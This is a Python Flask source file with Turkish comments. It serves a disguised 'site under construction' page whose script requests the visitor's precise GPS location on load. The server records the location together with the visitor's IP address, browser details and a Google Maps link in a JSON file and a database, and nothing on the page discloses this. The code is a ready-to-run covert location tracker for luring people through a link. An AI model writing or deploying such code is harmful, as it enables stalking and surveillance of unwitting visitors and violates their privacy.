from flask import Flask, request, render_template_string
import sqlite3
import json
import os
from datetime import datetime

app = Flask(__name__)

# Veritabanı başlatma
def init_db():
    conn = sqlite3.connect('visitors.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS visitors
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ip TEXT, user_agent TEXT, latitude REAL, longitude REAL, accuracy REAL, timestamp TEXT)''')
    conn.commit()
    conn.close()

# konum.json dosyasına yazma
def save_to_json(data):
    try:
        if os.path.exists('konum.json'):
            with open('konum.json', 'r') as f:
                existing_data = json.load(f)
        else:
            existing_data = []

        existing_data.append(data)
        with open('konum.json', 'w') as f:
            json.dump(existing_data, f, indent=4)
    except Exception as e:
        print(f"JSON Kaydetme Hatası: {e}")

# HTML şablonu
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Yapım Aşamasında</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
            background-size: 400%;
            animation: gradient 15s ease infinite;
            color: white;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        h1 {
            font-size: 3em;
            animation: fadeIn 2s ease-in-out;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(-20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <h1>Site Yapım Aşamasında</h1>

    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    fetch('/save_location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy })
                    });
                },
                error => {
                    console.log('Konum alınamadı: ' + error.message);
                    fetch('/save_location_error', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ error: error.message })
                    });
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            console.log('Tarayıcı konum servislerini desteklemiyor.');
        }
    </script>
</body>
</html>
"""

# Ana sayfa
@app.route('/')
def home():
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"\n=== Yeni Ziyaretçi ===")
    print(f"Ziyaretçi IP: {client_ip}")
    print(f"Tarayıcı/Cihaz: {user_agent}")
    print(f"Zaman: {timestamp}")

    return render_template_string(HTML_TEMPLATE)

# Konumu kaydet
@app.route('/save_location', methods=['POST'])
def save_location():
    try:
        data = request.get_json()
        latitude = data['latitude']
        longitude = data['longitude']
        accuracy = data['accuracy']
        client_ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Google Maps linki oluştur
        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"

        # Terminalde göster
        print(f"Hassas Konum: Enlem {latitude}, Boylam {longitude}")
        print(f"Sapma: {accuracy} metre")
        print(f"Harita: {maps_url}")

        # konum.json dosyasına kaydet
        location_data = {
            "ip": client_ip,
            "latitude": latitude,
            "longitude": longitude,
            "accuracy_meters": accuracy,
            "maps_url": maps_url,
            "timestamp": timestamp
        }
        save_to_json(location_data)

        # Veritabanına kaydet
        conn = sqlite3.connect('visitors.db')
        c = conn.cursor()
        c.execute("INSERT INTO visitors (ip, user_agent, latitude, longitude, accuracy, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                  (client_ip, request.headers.get('User-Agent'), latitude, longitude, accuracy, timestamp))
        conn.commit()
        conn.close()

        return 'Konum alındı'
    except Exception as e:
        print(f"Konum Hata: {e}")
        return 'Konum alınamadı', 400

# Konum hatasını kaydet
@app.route('/save_location_error', methods=['POST'])
def save_location_error():
    try:
        data = request.get_json()
        error_message = data['error']
        print(f"Konum Alınamadı: {error_message}")
        return 'Hata alındı'
    except Exception as e:
        print(f"Hata Kaydetme Hatası: {e}")
        return 'Hata alınamadı', 400

if __name__ == '__main__':
    init_db()  # Veritabanını başlat
    app.run(host='0.0.0.0', port=5000, debug=True)